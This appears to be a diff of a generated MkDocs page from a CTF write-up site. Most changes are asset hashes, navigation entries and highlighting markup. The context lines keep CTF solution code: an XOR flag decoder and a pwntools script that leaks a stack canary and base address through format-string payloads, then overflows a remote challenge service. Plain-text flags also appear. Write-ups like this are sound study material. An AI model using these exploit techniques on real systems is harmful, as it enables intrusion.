@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
     
     
       
@@ -46,7 +46,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.4031d38b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.82a18eb7.css">
       
         <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
       
@@ -62,7 +62,7 @@
     
       
         <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
-        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono&display=fallback">
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700%7CFira+Mono&display=fallback">
         <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
       
     
@@ -2457,18 +2457,6 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../../reverse/basic (SFConflict wzcboss@qq.com 2019-10-16-12-03-27)/" title="basic (SFConflict wzcboss@qq.com 2019 10 16 12 03 27)" class="md-nav__link">
-      basic (SFConflict wzcboss@qq.com 2019 10 16 12 03 27)
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
     <a href="../../../../reverse/basic/" title="Basic" class="md-nav__link">
       Basic
     </a>
@@ -2638,13 +2626,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-17" type="checkbox" id="nav-8-17">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-16" type="checkbox" id="nav-8-16">
     
-    <label class="md-nav__link" for="nav-8-17">
+    <label class="md-nav__link" for="nav-8-16">
       010editor
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-8-17">
+      <label class="md-nav__title" for="nav-8-16">
         010editor
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -2699,6 +2687,18 @@
   <li class="md-nav__item">
     <a href="../../../../ustc/857/" title="857" class="md-nav__link">
       857
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../ustc/math/" title="Math" class="md-nav__link">
+      Math
     </a>
   </li>
 
@@ -2947,7 +2947,7 @@
 <span class="k">while</span><span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len_e</span><span class="p">):</span>
     <span class="n">f</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mh">0x1a</span><span class="p">))</span>
     <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
-<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span>
 <span class="c1"># output:flag{E4Sy_X0R_3nCrypt10n}</span>
 </pre></div>
 
@@ -3189,7 +3189,7 @@ flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
 <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;159.65.68.241&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span> <span class="o">=</span> <span class="s1">&#39;0x400BC7&#39;</span><span class="p">):</span>
     <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;b *&quot;</span> <span class="o">+</span> <span class="n">addr</span><span class="p">)</span>
-    <span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;debug:&#39;</span><span class="p">)</span>
+    <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;debug:&#39;</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">formula</span><span class="p">):</span>
     <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
@@ -3294,13 +3294,13 @@ unsigned int Game()
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%71$p&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">250</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x365</span><span class="p">))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="n">canary</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;W&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;canary is &#39;</span><span class="o">+</span> <span class="n">canary</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;canary is &#39;</span><span class="o">+</span> <span class="n">canary</span><span class="p">)</span>
 <span class="c1">#gdb.attach(p)</span>
 <span class="c1">#pause()</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%3$p&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">250</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x19</span><span class="p">))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="n">base</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;W&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;base is &#39;</span><span class="o">+</span> <span class="n">base</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;base is &#39;</span><span class="o">+</span> <span class="n">base</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">base</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;2f5&#39;</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
@@ -3423,6 +3423,7 @@ flag{L3H_h3r3_1s_y0ur_ch1cken_dinner}</p>
                 
                   
                 
+                
               
               
                 <!-- Set from config but allow override -->
@@ -3518,7 +3519,7 @@ flag{L3H_h3r3_1s_y0ur_ch1cken_dinner}</p>
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.718059d6.js"></script>
+      <script src="../../../../assets/javascripts/application.d151b584.js"></script>
       
         
         
